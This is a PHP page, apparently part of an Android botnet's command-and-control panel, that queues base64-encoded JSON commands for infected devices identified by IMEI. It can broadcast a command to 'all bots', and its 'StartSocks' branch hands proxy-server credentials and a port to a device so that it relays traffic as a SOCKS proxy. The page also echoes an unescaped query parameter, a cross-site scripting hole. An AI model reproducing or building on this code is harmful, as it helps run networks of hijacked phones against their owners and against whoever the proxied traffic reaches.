<?php
session_start();
require_once './config/config.php';
require_once './includes/auth_validate.php';
require_once './includes/func.php';


//serve POST method, After successful insert, redirect to commands.php page.
if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
    //Mass Insert Data. Keep "name" attribute in html form same as column name in mysql table.
    $data_from_post = filter_input_array(INPUT_POST);
    // Get parameters from request
    $action = '';
    $last_id = '';
    $params = array();
    foreach ($data_from_post as $item => $value) {
        if ($item != "action") {$params[$item] = $value;}
        else {$action = $value;}
    }
    // add dummy values. do not ask why...
    if (count($params) == 0) {$params['dummy'] = 'value';}

    $imeis = preg_replace('/[^a-zA-Z0-9:]/', '', $_GET['clients']);

    # condition for send command to all bots, if no one bot has selected
    if (!$imeis){
        $rows = $db->get('clients');
        foreach ($rows as $row){
            $imeis = $imeis.$row['imei'].':';
        }
    }
    foreach (explode(":", $imeis) as $imei) {
        # socks hook
        if ($data_from_post['action'] == 'StartSocks'){
            $select = array('id', 'ip', 'forward_user', 'forward_pass');
            $db->where('id', $params['server-id']);
            $server = $db->get('proxy_servers');

            $params['user'] = $server[0]['forward_user'];
            $params['pass'] = $server[0]['forward_pass'];
            $params['ip'] = $server[0]['ip'];
            # it is going to proxy server and allocate free port
            $params['port'] = allocatePort($db, $params['server-id'], $imei);
        }
        if (!$imei) continue;
        // Create new command json
        $cmd_json = json_encode(array("action" => $data_from_post['action'],
            "result" => "done",
            "params" => $params));

        $data_to_store = array("imei" => $imei,
            "command_name" => $action,
            "command" => base64_encode($cmd_json));
        $last_id = $db->insert ('commands', $data_to_store);
    }
    

    //Insert timestamp
    # $data_to_store['created_at'] = date('Y-m-d H:i:s');

    #$last_id = $db->insert ('commands', $data_to_store);

    if($last_id)
    {
        $_SESSION['success'] = "command added successfully!";
        header('location: commands.php');
        exit();
    }
}

#if ($_GET['clients'] == ''){
#    $_SESSION['failure'] = "Please set one or more clients!";
#    header('location: clients.php');
#    exit();
#}

//We are using same form for adding and editing. This is a create form so declare $edit = false.
$edit = false;

require_once 'includes/header.php';
?>
    <div id="page-wrapper">
        <div class="row">
            <div class="col-lg-12">
                <h2 class="page-header">Add Command</h2>
            </div>

        </div>
        <?php # TODO: make check input parameters
            echo $_GET['clients'];
        ?>
        <!--<form class="form" action="" method="post"  id="command_form" enctype="multipart/form-data">-->
            <?php  include_once('./includes/forms/command_form.php'); ?>
        <!--</form>-->
    </div>


    <script type="text/javascript">
        $(document).ready(function(){
            $("#command_form").validate({
                rules: {
                    f_name: {
                        required: true,
                        minlength: 3
                    },
                    l_name: {
                        required: true,
                        minlength: 3
                    },
                }
            });
        });
    </script>

<?php include_once 'includes/footer.php'; ?>